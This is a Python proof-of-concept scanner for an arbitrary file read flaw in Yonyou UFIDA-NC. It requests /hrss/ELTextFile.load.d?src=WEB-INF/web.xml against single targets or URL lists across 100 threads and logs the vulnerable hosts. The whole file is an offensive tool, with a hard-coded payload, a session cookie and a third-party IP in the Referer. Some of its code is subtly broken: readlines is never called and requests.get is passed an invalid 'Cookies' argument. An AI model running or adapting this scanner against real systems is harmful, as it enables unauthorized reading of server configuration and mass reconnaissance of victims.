import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

RED = '\033[91m'
RESET = '\033[0m'

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:用友UFIDA-NC存在ELTextFile.load.d任意文件读取漏洞  
                                        version:1.0 author:YeahSir  

"""

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友UFIDA-NC存在ELTextFile.load.d任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help=' please input your url')
    parser.add_argument('-m','--file',dest='file',type=str,help='please input your file.exe')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='UTF-8') as f:
            for url in f.readlines:
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    payload = "/hrss/ELTextFile.load.d?src=WEB-INF/web.xml"
    url = target + payload
    Cookies = {"JSESSIONID": "36476623853683823261478BC55B6EA1.server"}
    headers = {
        "Cache-Control": "max-age=0", 
        "Upgrade-Insecure-Requests": "1", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
        "Referer": "http://120.220.14.108:9191/", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", 
        "Connection": "close"
        }
    
    try:
            re = requests.get(url=url,headers=headers,verify=False,Cookies=Cookies,timeout=20)
            if re.status_code == 200 :
                print( f"{RED}[+] {target} 存在任意文件读取漏洞！{RESET}")
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
            else:
                print(f'该{target}不存在任意文件读取漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")




if __name__ == '__main__':
    main()